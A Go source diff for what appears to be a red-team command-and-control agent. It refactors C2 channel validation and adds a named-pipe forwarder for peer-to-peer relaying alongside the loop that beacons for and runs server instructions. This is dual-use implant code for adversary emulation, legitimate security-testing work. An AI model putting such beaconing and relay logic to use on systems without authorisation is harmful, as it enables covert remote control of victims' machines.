@@ -27,7 +27,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 		if len(beacon) != 0 {
 			profile["paw"] = beacon["paw"]
 			checkin = time.Now()
-		} 
+		}
 
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
@@ -67,8 +67,6 @@ func buildProfile(server string, executors []string, privilege string, c2 string
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
 	profile["privilege"] = privilege
 	profile["exe_name"] = filepath.Base(os.Args[0])
-	profile["c2"] = strings.ToUpper(c2)
-
 
 	if len(localPipeName) > 0 {
 	    profile["localPipePath"] = fmt.Sprintf("\\\\.\\pipe\\%s", localPipeName)
@@ -81,17 +79,18 @@ func buildProfile(server string, executors []string, privilege string, c2 string
 
 func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
 	coms, _ := contact.CommunicationChannels[c2Config["c2Name"]]
-	if !validC2Configuration(coms, c2Config) {
+	if !validC2Configuration(profile, coms, c2Config) {
 		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
 		coms, _ = contact.CommunicationChannels["HTTP"]
 	}
+
 	return coms
 }
 
-func validC2Configuration(coms contact.Contact, c2Config map[string]string) bool {
+func validC2Configuration(profile map[string]interface{}, coms contact.Contact, c2Config map[string]string) bool {
 	if strings.EqualFold(c2Config["c2Name"], c2Config["c2Name"]) {
 		if _, valid := contact.CommunicationChannels[c2Config["c2Name"]]; valid {
-			return coms.C2RequirementsMet(c2Config)
+			return coms.C2RequirementsMet(profile, c2Config)
 		}
 	}
 	return false
@@ -112,12 +111,19 @@ func Core(server string, delay int, executors []string, c2 map[string]string, lo
 	    output.VerbosePrint(fmt.Sprintf("Listening on named pipe %s for p2p forwarding.", localPipeName))
 	}
 
-	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"], localPipeName)
+	profile := buildProfile(server, executors, privilege, c2["c2Name"], localPipeName)
 	util.Sleep(float64(delay))
 
 	for {
 		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
+		    // Set up local listening pipe if specified, for p2p forwarding.
+		    if len(localPipeName) > 0 {
+		        forwarder := contact.SmbPipeForwarder{}
+		        go forwarder.ListenForClient(profile)
+		    }
+
+		    // Run agent
 			for { runAgent(coms, profile) }
 		}
 		util.Sleep(300)
